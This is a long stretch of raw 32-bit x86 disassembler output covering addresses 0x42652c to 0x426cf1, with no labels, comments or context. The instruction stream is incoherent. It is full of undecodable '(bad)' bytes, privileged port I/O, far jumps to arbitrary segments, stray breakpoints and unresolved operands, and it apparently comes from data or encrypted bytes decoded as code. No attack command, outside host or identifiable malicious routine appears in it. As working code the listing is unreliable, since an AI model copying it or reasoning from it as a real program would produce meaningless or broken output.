  42652c:	(bad)  
  42652d:	push   ds
  42652e:	ficomp DWORD PTR [esi+0x3806065b]
  426534:	xchg   esi,eax
  426535:	jp     0x42650b
  426537:	jle    0x426531
  426539:	push   edi
  42653a:	mov    ebx,ebx
  42653c:	xchg   edi,eax
  42653d:	xor    eax,0xd01d1e84
  426542:	mov    edi,0xd0b8d434
  426547:	test   BYTE PTR [edi-0x78],bl
  42654a:	jno    0x426564
  42654c:	cmp    ah,dl
  42654e:	lock mov BYTE PTR [ebp+0x17a71b96],bl
  426555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426556:	mov    BYTE PTR [ebp-0x57a0a616],bh
  42655c:	push   ebp
  42655d:	sbb    ecx,DWORD PTR [ebp-0x4a]
  426560:	pop    DWORD PTR [edx+0x1523d45b]
  426566:	gs js  0x42652f
  426569:	out    dx,eax
  42656a:	sbb    al,0xbc
  42656c:	fsubr  QWORD PTR [edi+0x375d61d3]
  426572:	mov    DWORD PTR [eax-0x3765ce2e],esi
  426578:	loop   0x42651d
  42657a:	data16 sar BYTE PTR ds:0xa00ca6ea,cl
  426581:	cs add eax,0x5f795fb1
  426587:	sbb    BYTE PTR [eax],ch
  426589:	shr    DWORD PTR [eax],cl
  42658b:	inc    esp
  42658c:	cld    
  42658d:	cmp    dl,BYTE PTR [esi]
  42658f:	adc    edi,DWORD PTR [eax+0x2]
  426592:	iret   
  426593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426594:	out    0xf7,al
  426596:	nop
  426597:	xor    eax,0xcae5967e
  42659c:	xchg   ecx,eax
  42659d:	mov    bh,0x2a
  42659f:	popa   
  4265a0:	push   esp
  4265a1:	jbe    0x4265df
  4265a3:	fsubr  st(1),st
  4265a5:	add    BYTE PTR [esi],0xd0
  4265a8:	jb     0x42654b
  4265aa:	xchg   ecx,eax
  4265ab:	and    BYTE PTR ds:0xd10ad33d,dl
  4265b1:	xchg   DWORD PTR [ebx+0x77],ebx
  4265b4:	mov    cl,0xd1
  4265b6:	add    esi,esi
  4265b8:	xor    eax,DWORD PTR [ecx-0x56]
  4265bb:	hlt    
  4265bc:	cs pop esp
  4265be:	in     eax,dx
  4265bf:	ins    DWORD PTR es:[edi],dx
  4265c0:	mov    al,0x1b
  4265c2:	or     bl,BYTE PTR [edi+0x435713db]
  4265c8:	and    eax,0x50780956
  4265cd:	inc    edi
  4265ce:	xchg   esi,eax
  4265d0:	cmp    eax,0x573dd470
  4265d5:	arpl   bx,ax
  4265d7:	sub    BYTE PTR [ecx],cl
  4265d9:	test   DWORD PTR [ebx+ecx*8],0x88a73f3e
  4265e0:	cmc    
  4265e1:	push   eax
  4265e2:	or     al,BYTE PTR [ebp+eax*4+0xfb5d5b8]
  4265e9:	dec    ebp
  4265ea:	and    al,0x76
  4265ec:	pop    es
  4265ed:	xlat   BYTE PTR ds:[ebx]
  4265ee:	hlt    
  4265ef:	push   0x4fa0b7df
  4265f4:	aas    
  4265f5:	das    
  4265f6:	in     al,dx
  4265f7:	push   0x573165a2
  4265fc:	pop    esp
  4265fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265fe:	xlat   BYTE PTR ds:[ebx]
  4265ff:	inc    edx
  426600:	dec    esi
  426601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426602:	inc    esi
  426603:	iret   
  426604:	not    DWORD PTR ds:0x3899bfee
  42660a:	fs mov ebx,0xb43fde3f
  426610:	repnz fstp TBYTE PTR [ebx+0x7c36549a]
  426617:	div    BYTE PTR [ebx+ecx*4+0x26]
  42661b:	and    al,0x47
  42661d:	data16 xor al,cl
  426620:	sbb    ch,BYTE PTR [eax]
  426622:	push   eax
  426624:	in     eax,0x44
  426626:	(bad)  [ecx]
  426628:	(bad)  
  426629:	idiv   DWORD PTR [edi+ebp*2]
  42662c:	inc    eax
  42662d:	mov    eax,0xa57396cf
  426632:	icebp  
  426633:	cmp    eax,0xaa13c3a2
  426638:	loopne 0x426653
  42663a:	lea    esp,[ebx+0x47]
  42663d:	dec    eax
  42663e:	xchg   esp,eax
  42663f:	push   ss
  426640:	mov    ds:0xa4826b7c,eax
  426645:	pop    ecx
  426646:	leave  
  426647:	mov    es,WORD PTR [ebx-0x6fb94d71]
  42664d:	sub    ah,BYTE PTR [ebx+0x40]
  426650:	retf   
  426651:	repnz push cs
  426653:	jp     0x426602
  426655:	mov    ds:0xeaad8adc,eax
  42665a:	inc    ebp
  42665b:	xchg   ebx,eax
  42665c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42665d:	mov    cl,0xe0
  42665f:	das    
  426660:	scas   eax,DWORD PTR es:[edi]
  426661:	sbb    DWORD PTR ds:0xca0fc2a5,ecx
  426667:	add    BYTE PTR [edx],ch
  426669:	js     0x42668f
  42666b:	icebp  
  42666c:	jmp    0x37863c68
  426671:	or     edx,DWORD PTR [esi]
  426673:	push   0x25
  426675:	pusha  
  426676:	sub    BYTE PTR [eax],cl
  426678:	push   ebx
  426679:	lahf   
  42667a:	cmp    ah,BYTE PTR [ebp-0x26b7e7c9]
  426680:	jmp    0xfe36:0x7f1044
  426687:	call   0xe2f8a13
  42668c:	sti    
  42668d:	dec    edx
  42668e:	pop    esi
  42668f:	jg     0x426625
  426691:	dec    ebp
  426692:	test   al,0x64
  426694:	add    eax,0x65a3c980
  426699:	pop    ecx
  42669a:	ret    0x74d2
  42669d:	pop    ds
  42669e:	mov    cs,WORD PTR [ebp-0x1e]
  4266a1:	cli    
  4266a2:	in     eax,dx
  4266a3:	cmp    ah,ch
  4266a5:	ror    DWORD PTR [eax-0x7e7773ec],cl
  4266ab:	adc    ecx,DWORD PTR [ebx+0x30]
  4266ae:	sbb    DWORD PTR [ecx-0x8ab2681],ebx
  4266b4:	inc    ebp
  4266b5:	(bad)  
  4266b7:	out    0x65,eax
  4266b9:	jb     0x4266c3
  4266bb:	or     cl,BYTE PTR [eax+eax*8-0xe876d62]
  4266c2:	ret    
  4266c3:	xor    al,0x48
  4266c5:	push   ecx
  4266c6:	inc    ebx
  4266c7:	mov    edi,0xae19d0a3
  4266cc:	xchg   BYTE PTR [ecx+edx*2-0x7],ch
  4266d0:	in     al,dx
  4266d1:	sbb    esp,esp
  4266d3:	imul   ebp,DWORD PTR [eax-0x740120c4],0xd3fade55
  4266dd:	mov    bh,0x10
  4266df:	nop
  4266e0:	pop    ss
  4266e1:	and    ah,BYTE PTR ds:[edx+0xc33f31f]
  4266e8:	adc    BYTE PTR [edx+0x35],dh
  4266eb:	mov    dl,0xd6
  4266ed:	push   eax
  4266ee:	imul   edi,eax,0x5bf578d7
  4266f4:	(bad)  
  4266f5:	enter  0xae47,0x3e
  4266f9:	into   
  4266fa:	pop    ebp
  4266fb:	push   esp
  4266fc:	call   0x5c968c8b
  426701:	aas    
  426702:	sbb    al,0x70
  426704:	scas   eax,DWORD PTR es:[edi]
  426705:	or     eax,0xf9107cd5
  42670a:	dec    ecx
  42670b:	push   ds
  42670c:	lods   al,BYTE PTR ds:[esi]
  42670d:	or     al,0xc5
  42670f:	mov    dl,0xd3
  426711:	fs adc al,0x2
  426714:	dec    edx
  426715:	leave  
  426716:	inc    eax
  426717:	sbb    esi,ebp
  426719:	ja     0x4266b6
  42671b:	pop    esi
  42671c:	mov    dl,0x69
  42671e:	cs into 
  426720:	pusha  
  426721:	dec    edx
  426722:	dec    esp
  426723:	cmp    BYTE PTR ds:0x282cea06,ch
  426729:	inc    ecx
  42672a:	pushf  
  42672b:	and    dh,BYTE PTR [eax+0x180ef024]
  426731:	push   edi
  426732:	pop    esp
  426733:	mov    edx,cs
  426735:	sar    BYTE PTR [ecx-0xa],cl
  426738:	mov    ebx,0xdeb29ee
  42673d:	cwde   
  42673e:	iret   
  42673f:	inc    ebp
  426740:	add    bh,BYTE PTR [ebx-0x6cc6fe96]
  426746:	fimul  WORD PTR [ebp+0x44]
  426749:	stos   DWORD PTR es:[edi],eax
  42674a:	add    DWORD PTR [ecx],esp
  42674c:	jp     0x426793
  42674e:	or     eax,0x31c75622
  426753:	push   0xffffffa9
  426755:	aas    
  426756:	mov    ebx,0x58dbb91
  42675b:	mov    ecx,0x57218fb1
  426760:	test   al,0x9
  426762:	push   ds
  426763:	push   cs
  426764:	inc    esi
  426765:	adc    edi,esi
  426767:	pop    es
  426768:	lods   eax,DWORD PTR ds:[esi]
  42676a:	pop    esi
  42676b:	adc    al,0x42
  42676d:	(bad)
  426770:	jbe    0x42679f
  426772:	scas   eax,DWORD PTR es:[edi]
  426773:	push   ss
  426774:	mov    edi,0xfdf5eeef
  426779:	xchg   esp,eax
  42677a:	sbb    DWORD PTR [eax-0x60],eax
  42677d:	pop    ebp
  42677e:	jnp    0x4267be
  426780:	lea    ebp,[ecx-0x6b]
  426783:	ss mov eax,0xf1c51719
  426789:	dec    edi
  42678a:	xchg   ebp,eax
  42678b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42678c:	addr16 (bad) 
  42678f:	mov    ds,esp
  426791:	fdivr  DWORD PTR [eax]
  426793:	imul   ecx,DWORD PTR [esi],0xb7cbc25c
  426799:	(bad)  
  42679b:	in     al,0x3d
  42679d:	loopne 0x426817
  42679f:	adc    BYTE PTR [esi+0x5f],dl
  4267a2:	inc    ebp
  4267a3:	and    eax,0x83955a76
  4267a8:	and    dh,BYTE PTR [edx+0x4]
  4267ab:	fnsave [eax+0x7dab943d]
  4267b1:	inc    esp
  4267b2:	inc    ebp
  4267b3:	mov    ds:0xeeb99640,eax
  4267b8:	fwait
  4267b9:	or     bh,bl
  4267bb:	jg     0x426803
  4267bd:	(bad)  
  4267be:	fisub  DWORD PTR [edi]
  4267c0:	sbb    BYTE PTR [ebp+0x44],cl
  4267c3:	add    BYTE PTR [ecx+0x1b],bl
  4267c6:	dec    esp
  4267c7:	mov    bl,0xd0
  4267c9:	adc    al,0x8f
  4267cb:	xor    DWORD PTR [ebx],edx
  4267cd:	xchg   esi,eax
  4267ce:	pop    eax
  4267cf:	retf   
  4267d0:	mov    es,WORD PTR [ebp-0x370cca89]
  4267d6:	pop    ss
  4267d7:	pop    ecx
  4267d8:	dec    eax
  4267d9:	dec    ebp
  4267da:	popa   
  4267db:	mov    al,0xb6
  4267dd:	pusha  
  4267de:	in     eax,dx
  4267df:	sub    eax,0xe361dfde
  4267e4:	or     BYTE PTR [ecx-0x11e328ac],cl
  4267ea:	ja     0x4267f2
  4267ec:	shr    BYTE PTR [edx+esi*1],0xad
  4267f0:	in     eax,0x9f
  4267f2:	sti    
  4267f3:	adc    esi,0x686a16e0
  4267f9:	aam    0x20
  4267fb:	and    cl,dh
  4267fd:	pop    edx
  4267fe:	adc    al,0xb2
  426800:	enter  0xd91e,0x6d
  426804:	rcr    ah,0x8e
  426807:	(bad)  
  426808:	clc    
  426809:	aad    0x64
  42680b:	push   0xffffff9d
  42680d:	fwait
  42680e:	aam    0x7
  426810:	push   edi
  426811:	rcr    BYTE PTR [edx+edx*4+0x74],0xa
  426816:	enter  0xc48d,0xbf
  42681a:	sbb    eax,0xa6e234fc
  42681f:	out    dx,al
  426820:	in     eax,dx
  426821:	arpl   WORD PTR [edi-0x13],bp
  426824:	out    0xcf,eax
  426826:	mov    BYTE PTR [ebx],dl
  426828:	mov    dl,0x20
  42682a:	mov    ch,0x42
  42682c:	loopne 0x4267da
  42682e:	enter  0x2a1f,0x45
  426832:	xor    DWORD PTR [edi+eiz*1],esp
  426835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426836:	xor    DWORD PTR [eax],0x22073516
  42683c:	idiv   ch
  42683e:	dec    esp
  42683f:	sub    esi,DWORD PTR [edi+0x41]
  426842:	pop    eax
  426843:	and    eax,0xb69f464c
  426848:	loopne 0x426853
  42684a:	push   ecx
  42684b:	test   DWORD PTR [edi],edi
  42684d:	repz xor cl,0x39
  426851:	and    ah,dl
  426853:	adc    DWORD PTR [ebx+0x4e8a9b70],eax
  426859:	xor    al,0xe6
  42685b:	sub    eax,ecx
  42685d:	xlat   BYTE PTR ds:[ebx]
  42685e:	pop    es
  42685f:	dec    esi
  426860:	in     eax,0xdf
  426862:	mov    WORD PTR ds:0x9b6502df,?
  426868:	js     0x426836
  42686a:	sbb    esi,0x563ed8fc
  426870:	mov    esi,0x1d131819
  426875:	mov    edx,edx
  426877:	shl    BYTE PTR [edi-0x36],0x5
  42687b:	aad    0x29
  42687d:	mov    dl,0x5b
  42687f:	push   eax
  426880:	ret    
  426881:	or     dh,0x33
  426884:	mov    edx,0x44c7272c
  426889:	mov    WORD PTR [edi+ebp*1-0x294bc5ed],?
  426890:	pop    edx
  426891:	mov    ecx,0xe55bbed7
  426896:	mov    bl,0x72
  426898:	pusha  
  426899:	rcr    cl,0x28
  42689c:	in     al,0x68
  42689e:	cmp    ecx,eax
  4268a0:	jb     0x426846
  4268a2:	jp     0x426881
  4268a4:	mov    edi,0xf3d72d0b
  4268a9:	xor    dl,BYTE PTR [eax+eiz*8+0x28]
  4268ad:	in     eax,0x9
  4268af:	mov    eax,0xfdbc45ba
  4268b4:	mov    ds:0xaf04fc07,eax
  4268b9:	jle    0x42692a
  4268bb:	jae    0x426843
  4268bd:	xchg   edx,eax
  4268be:	pop    ecx
  4268bf:	sbb    al,0xae
  4268c1:	icebp  
  4268c2:	gs inc ebp
  4268c4:	adc    al,0xf1
  4268c6:	push   0xb484d426
  4268cb:	fadd   QWORD PTR [ebp+0x73dc5416]
  4268d1:	and    DWORD PTR [edi+0x7f9a33f6],ebp
  4268d7:	inc    esi
  4268d8:	stc    
  4268d9:	lea    esp,[ecx-0x4559c118]
  4268df:	jnp    0x426889
  4268e1:	fiadd  WORD PTR [edx]
  4268e3:	or     al,0x6
  4268e5:	push   ecx
  4268e6:	stos   BYTE PTR es:[edi],al
  4268e7:	mov    bh,0xff
  4268e9:	push   ebp
  4268ea:	mov    eax,0x29a6bf9f
  4268ef:	ret    
  4268f0:	xor    ebp,edx
  4268f2:	rcr    BYTE PTR [ebp+eax*4+0x45],1
  4268f6:	loope  0x426943
  4268f8:	int3   
  4268f9:	test   ah,cl
  4268fb:	cdq    
  4268fc:	mov    esi,0xa6284858
  426901:	cmp    DWORD PTR ds:0xc4be61aa,esp
  426907:	pusha  
  426908:	mov    WORD PTR [edi-0xf5d0070],?
  42690e:	add    BYTE PTR [eax-0x17],0xd5
  426912:	mov    ds:0x31169a91,al
  426917:	xlat   BYTE PTR ds:[ebx]
  426918:	inc    ecx
  426919:	aaa    
  42691a:	or     al,0x4f
  42691c:	pop    eax
  42691d:	ja     0x4268e5
  42691f:	(bad)
  426922:	adc    eax,0xb669f8e7
  426927:	jmp    FWORD PTR [edx+0x8]
  42692a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42692b:	sbb    eax,0x8e742bd8
  426931:	jecxz  0x42692e
  426933:	mov    WORD PTR [edi-0x1fe3b81e],ss
  426939:	add    eax,DWORD PTR [ebp-0x28f1775b]
  42693f:	enter  0x65af,0x45
  426943:	pop    es
  426944:	(bad)  
  426945:	(bad)  
  426947:	mov    BYTE PTR [ebp-0x55],0x35
  42694b:	xor    DWORD PTR [eax],edx
  42694d:	dec    esp
  42694e:	cs retf 
  426950:	sub    dh,dh
  426952:	adc    al,0x6f
  426954:	xor    al,0xfa
  426956:	sbb    DWORD PTR [eax],edi
  426958:	aas    
  426959:	inc    esp
  42695a:	mov    ebp,0x5f5a6896
  42695f:	ficomp WORD PTR [edi]
  426961:	test   al,0x26
  426963:	xor    al,0x3b
  426965:	ror    BYTE PTR [ebp+0x1],1
  426968:	xchg   edx,eax
  426969:	mov    edi,0xf53647e
  42696e:	push   ebp
  42696f:	add    ecx,DWORD PTR ds:0xee0a51bf
  426975:	lds    ecx,FWORD PTR [edi+eiz*1+0x7cf4b5e1]
  42697c:	je     0x426954
  42697e:	outs   dx,BYTE PTR ds:[esi]
  42697f:	adc    eax,0xaac36800
  426984:	pushf  
  426985:	aas    
  426986:	xchg   esp,eax
  426987:	inc    edx
  426988:	jle    0x426943
  42698a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42698b:	sbb    BYTE PTR gs:[ebx],0x18
  42698f:	or     al,0xaf
  426991:	jb     0x4269be
  426993:	lods   al,BYTE PTR ds:[esi]
  426994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426995:	ret    
  426996:	cmp    al,0xd5
  426998:	mov    ch,0x30
  42699a:	push   ss
  42699b:	lock dec ebp
  42699d:	stc    
  42699e:	loope  0x4269f8
  4269a0:	(bad)  
  4269a1:	jb     0x426984
  4269a3:	cmp    eax,0x32615d5d
  4269a8:	dec    esi
  4269a9:	push   0xffffff87
  4269ab:	loope  0x42693e
  4269ad:	test   DWORD PTR [ebx],edi
  4269af:	xchg   ebx,eax
  4269b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269b1:	icebp  
  4269b2:	cld    
  4269b3:	sub    eax,0xa9b39749
  4269b8:	rcl    BYTE PTR [eax+0x44c2a111],cl
  4269be:	dec    edi
  4269bf:	sbb    eax,0xa75a98ad
  4269c4:	jge    0x42699d
  4269c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269c7:	pop    es
  4269c8:	(bad)  [ecx]
  4269ca:	into   
  4269cb:	mov    al,al
  4269cd:	and    al,0xdc
  4269cf:	(bad)  
  4269d0:	out    0x90,eax
  4269d2:	into   
  4269d3:	push   ss
  4269d4:	inc    ecx
  4269d5:	cmp    al,0xe1
  4269d7:	sti    
  4269d8:	mov    al,0x0
  4269da:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4269dc:	sub    DWORD PTR [eax+eax*8],eax
  4269df:	cdq    
  4269e0:	retf   
  4269e1:	inc    ebx
  4269e2:	add    eax,0x288badd8
  4269e7:	push   0x7db2d58f
  4269ec:	xchg   ecx,eax
  4269ed:	cs (bad) 
  4269ef:	out    0x5a,al
  4269f1:	ds or  eax,0xa8966a4b
  4269f7:	scas   eax,DWORD PTR es:[edi]
  4269f8:	(bad)
  4269fb:	clc    
  4269fc:	int3   
  4269fd:	data16 jmp 0x426a13
  426a00:	and    eax,0x811467
  426a05:	jge    0x4269bf
  426a07:	dec    eax
  426a08:	xchg   esp,eax
  426a09:	pop    edx
  426a0a:	lods   al,BYTE PTR ds:[esi]
  426a0b:	push   ecx
  426a0c:	nop    DWORD PTR [eax+edi*8]
  426a10:	and    al,0xf5
  426a12:	das    
  426a13:	add    DWORD PTR es:[ebp+0x4604b494],edi
  426a1a:	jo     0x4269e2
  426a1c:	pushf  
  426a1d:	stc    
  426a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a1f:	or     esi,ecx
  426a21:	adc    BYTE PTR [edx-0x7f0b269d],ah
  426a27:	adc    ecx,0xffffffe0
  426a2a:	sbb    al,0xf4
  426a2c:	pop    edi
  426a2d:	pop    edx
  426a2e:	xchg   edi,eax
  426a2f:	ins    BYTE PTR es:[edi],dx
  426a30:	shr    DWORD PTR [edi-0xa],0x5
  426a34:	nop
  426a35:	rcl    WORD PTR [ebx+edi*2+0x6682e449],0x6b
  426a3e:	or     eax,0x79a37cfb
  426a43:	imul   ebp,DWORD PTR [ebx-0x4dcf0b34],0xec466967
  426a4d:	addr16 aas 
  426a4f:	fild   WORD PTR [ebp-0xf]
  426a52:	and    al,0xf7
  426a54:	jle    0x426ac9
  426a56:	pop    edx
  426a57:	or     eax,DWORD PTR [ecx-0x2]
  426a5a:	sti    
  426a5b:	outs   dx,DWORD PTR ds:[esi]
  426a5c:	inc    ebp
  426a5d:	call   0xc922dd14
  426a62:	dec    ebp
  426a63:	scas   al,BYTE PTR es:[edi]
  426a64:	mov    WORD PTR [edi],fs
  426a66:	sub    ecx,DWORD PTR [edx+0x13]
  426a69:	data16 scas al,BYTE PTR es:[edi]
  426a6b:	arpl   bp,si
  426a6d:	nop
  426a6e:	out    0x98,al
  426a70:	outs   dx,DWORD PTR ds:[esi]
  426a71:	cmp    al,0x25
  426a73:	out    dx,eax
  426a74:	and    al,0x2e
  426a76:	push   0x3bf27482
  426a7b:	stos   BYTE PTR es:[edi],al
  426a7c:	mov    eax,ds:0x54feb311
  426a81:	mov    ebx,0x4270ee6f
  426a86:	iret   
  426a87:	ja     0x426af2
  426a89:	push   0xffffffd0
  426a8b:	jl     0x426a3b
  426a8d:	in     eax,dx
  426a8e:	lock inc edx
  426a90:	mov    ds:0xf5b6c75f,eax
  426a95:	dec    esp
  426a96:	inc    ecx
  426a97:	je     0x426aff
  426a99:	push   ebx
  426a9a:	inc    esp
  426a9b:	push   esi
  426a9c:	cmp    dh,BYTE PTR [esi]
  426a9e:	inc    ecx
  426a9f:	adc    esi,esi
  426aa1:	and    al,0x2a
  426aa3:	add    ebp,esi
  426aa5:	push   ecx
  426aa6:	call   0xf8f:0x9dfd146
  426aad:	popf   
  426aae:	sub    BYTE PTR [ebx+0x66],ch
  426ab1:	xchg   ecx,eax
  426ab2:	nop
  426ab3:	jnp    0x426aee
  426ab5:	xchg   ebp,eax
  426ab6:	cs dec ebx
  426ab8:	mov    bl,0xbf
  426aba:	arpl   WORD PTR [esi],cx
  426abc:	int3   
  426abd:	dec    edx
  426abe:	iret   
  426abf:	arpl   bp,bx
  426ac1:	pop    esi
  426ac2:	sub    eax,0x2bddaf63
  426ac7:	mov    esp,0x8948dee4
  426acc:	fisub  DWORD PTR [eax-0x4e]
  426acf:	adc    ah,BYTE PTR [esp+edx*4]
  426ad2:	pop    es
  426ad3:	mov    ch,0xc
  426ad5:	jg     0x426ae5
  426ad7:	lock int3 
  426ad9:	dec    edi
  426ada:	jbe    0x426b2b
  426adc:	int3   
  426add:	pop    ebp
  426ade:	lods   al,BYTE PTR ss:[esi]
  426ae0:	cld    
  426ae1:	adc    al,0xf6
  426ae3:	jg     0x426b61
  426ae5:	jl     0x426aad
  426ae7:	stos   BYTE PTR es:[edi],al
  426ae8:	lock std 
  426aea:	fstp   QWORD PTR ds:0xb09d6145
  426af0:	repnz into 
  426af2:	or     eax,0x60d6a006
  426af7:	push   edx
  426af8:	adc    DWORD PTR [edx-0x2c],0x530e0f36
  426aff:	jg     0x426b21
  426b01:	pusha  
  426b02:	bound  ebp,QWORD PTR [esi-0x2ddd6cf6]
  426b08:	jae    0x426b4a
  426b0a:	xlat   BYTE PTR ds:[ebx]
  426b0b:	mov    eax,ds:0xf5a31d48
  426b10:	and    ch,BYTE PTR [esi-0x723a2630]
  426b16:	das    
  426b17:	mov    edx,edx
  426b19:	sub    DWORD PTR [edx],ebx
  426b1b:	jg     0x426b27
  426b1d:	xor    ebp,DWORD PTR [edx+0x6b]
  426b20:	sti    
  426b21:	cld    
  426b22:	daa    
  426b23:	fbstp  TBYTE PTR [ebx-0x23219b53]
  426b29:	scas   eax,DWORD PTR es:[edi]
  426b2a:	mov    ebp,0xde27c5bb
  426b2f:	into   
  426b30:	outs   dx,DWORD PTR ds:[esi]
  426b31:	xor    eax,DWORD PTR cs:[edi+0x4d]
  426b35:	xchg   ebp,eax
  426b36:	retf   
  426b37:	mov    esi,0xd447be76
  426b3c:	mov    eax,0x7bce6c5e
  426b41:	(bad)  
  426b42:	jo     0x426b23
  426b44:	sub    al,0xb
  426b46:	or     BYTE PTR [ebx+0x52],cl
  426b49:	fidiv  DWORD PTR [edx-0x25]
  426b4c:	std    
  426b4d:	inc    ebx
  426b4e:	mov    edi,0x93982a47
  426b53:	and    dl,BYTE PTR [ebx]
  426b55:	(bad)  
  426b56:	mov    dl,0xb9
  426b58:	or     cl,bh
  426b5a:	xor    DWORD PTR [ecx+edx*4-0x28fba7b8],edx
  426b61:	adc    al,0x2c
  426b63:	lock or eax,0x5adeec2f
  426b69:	inc    edx
  426b6a:	inc    edi
  426b6b:	jb     0x426af8
  426b6d:	add    ebx,ecx
  426b6f:	and    DWORD PTR [eax-0x61],ecx
  426b72:	xchg   ebp,eax
  426b73:	and    ebx,DWORD PTR [ebx-0x20f68a0e]
  426b79:	cli    
  426b7a:	inc    ecx
  426b7b:	loope  0x426bcc
  426b7d:	mov    ebp,0x49
	...
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0xa781,0x2c
  426b98:	arpl   WORD PTR [edi-0x69],cx
  426b9b:	clc    
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	jge    0x426ba6
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ba3:	inc    eax
  426ba4:	in     eax,0x49
  426ba6:	lahf   
  426ba7:	pop    edi
  426ba8:	sbb    edx,0x34835d87
  426bae:	xor    eax,0x5d6ebf1c
  426bb3:	and    al,0x76
  426bb5:	imul   edi,DWORD PTR [ecx-0x5d],0xa
  426bb9:	repnz fucom st(5)
  426bbc:	sbb    BYTE PTR [ebx-0x33],bl
  426bbf:	jecxz  0x426bf2
  426bc1:	mov    ds,edi
  426bc3:	(bad)  
  426bc4:	xchg   ebx,eax
  426bc5:	into   
  426bc6:	jge    0x426bde
  426bc8:	in     al,0xfc
  426bca:	sub    eax,DWORD PTR [ecx+0x440b887c]
  426bd0:	or     ebp,DWORD PTR [edx]
  426bd2:	jb     0x426bed
  426bd4:	push   eax
  426bd5:	fwait
  426bd6:	cmp    esp,DWORD PTR [ebp-0x7f]
  426bd9:	rcl    BYTE PTR [ebp+0xb],1
  426bdc:	scas   al,BYTE PTR es:[edi]
  426bdd:	test   BYTE PTR [esi-0x59],dl
  426be0:	or     al,0xd
  426be2:	shl    BYTE PTR [esi+0x54fa9ebe],0xa4
  426be9:	pop    ecx
  426bea:	push   ecx
  426beb:	jge    0x426c4f
  426bed:	add    bh,dh
  426bef:	and    BYTE PTR ds:0x3c224fce,al
  426bf5:	mov    ecx,0xfd8a1b62
  426bfa:	fisttp QWORD PTR [edi-0x3fcc858d]
  426c00:	imul   edx,DWORD PTR [edi-0x13],0xfffffff3
  426c04:	fwait
  426c05:	mov    WORD PTR [edx+0x5af67b7e],?
  426c0b:	repz test al,0x76
  426c0e:	push   eax
  426c0f:	rol    cl,cl
  426c11:	push   edx
  426c12:	aad    0x93
  426c14:	das    
  426c15:	(bad)  
  426c16:	push   esp
  426c17:	aas    
  426c18:	mov    al,0xb8
  426c1a:	imul   ecx,DWORD PTR [edi+0x76],0x55
  426c1e:	xchg   ebx,ebp
  426c20:	or     edi,esi
  426c22:	pop    ecx
  426c23:	out    0x66,al
  426c25:	pop    esp
  426c26:	inc    edi
  426c27:	jnp    0x426c3b
  426c29:	xor    DWORD PTR [ecx+eax*4-0x26f70c8d],eax
  426c30:	mov    ah,0x13
  426c32:	xor    eax,0x85a178d7
  426c37:	das    
  426c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c39:	push   es
  426c3a:	xchg   edi,eax
  426c3b:	xor    eax,DWORD PTR [eax]
  426c3d:	cmc    
  426c3e:	loopne 0x426c05
  426c40:	aad    0x4f
  426c42:	out    dx,eax
  426c43:	mov    ds,WORD PTR [esi+0x5d]
  426c46:	enter  0x7fa4,0xfe
  426c4a:	mov    dl,0x7c
  426c4c:	inc    edi
  426c4d:	push   esi
  426c4e:	push   ss
  426c4f:	ss dec ebx
  426c51:	sbb    ebp,DWORD PTR [edi+0x4a59e466]
  426c57:	or     BYTE PTR [esi-0x7b],al
  426c5a:	or     al,0xb7
  426c5c:	imul   ebx,DWORD PTR [ecx-0x3f],0x3c6c73a3
  426c63:	imul   edx,DWORD PTR [edx],0x13669c1c
  426c69:	inc    ecx
  426c6a:	jecxz  0x426ca4
  426c6c:	pop    ss
  426c6d:	inc    ecx
  426c6e:	mov    eax,0x94375087
  426c73:	ror    DWORD PTR [edx-0x4a],1
  426c76:	jo     0x426c06
  426c78:	push   edi
  426c79:	fadd   DWORD PTR [ebp-0x54d5423]
  426c7f:	sub    eax,0x80f680e0
  426c84:	sub    ebp,DWORD PTR [eax-0xc6c47f9]
  426c8a:	and    BYTE PTR [esi-0x74],bl
  426c8d:	iret   
  426c8e:	(bad)  
  426c8f:	fcmovne st,st(6)
  426c91:	lea    ebp,[edi+eax*2]
  426c94:	das    
  426c95:	out    dx,al
  426c96:	loopne 0x426c9c
  426c98:	cmp    BYTE PTR [ebx+eiz*1],0xda
  426c9c:	push   cs
  426c9d:	or     ch,ch
  426c9f:	ret    0xac0
  426ca2:	fisubr DWORD PTR [esi+0x24]
  426ca5:	xchg   DWORD PTR [esi],ebx
  426ca7:	and    eax,0x38f5d79e
  426cac:	adc    esi,esi
  426cae:	sar    BYTE PTR [edx-0x55a9008d],cl
  426cb4:	mov    DWORD PTR [esi-0x3667b06f],0xd3161802
  426cbe:	bound  esi,QWORD PTR [edi]
  426cc0:	int    0xbf
  426cc2:	adc    cl,BYTE PTR [edx+0x3de3f629]
  426cc8:	jl     0x426cf4
  426cca:	xchg   ecx,eax
  426ccb:	sbb    dh,BYTE PTR ds:0x2be68f6a
  426cd1:	outs   dx,DWORD PTR ds:[esi]
  426cd2:	push   0x47
  426cd4:	addr16 add esi,ebp
  426cd7:	cwde   
  426cd8:	fs push ecx
  426cda:	or     eax,0xa58d54f3
  426cdf:	nop
  426ce0:	mov    esp,es
  426ce2:	stos   BYTE PTR es:[edi],al
  426ce3:	dec    esp
  426ce4:	jmp    0x426d18
  426ce6:	int    0x87
  426ce8:	(bad)
  426ceb:	arpl   WORD PTR [ebx+ebx*4-0x9],dx
  426cef:	and    DWORD PTR [esi],ecx
  426cf1:	mov    al,gs:0x3e453ec0
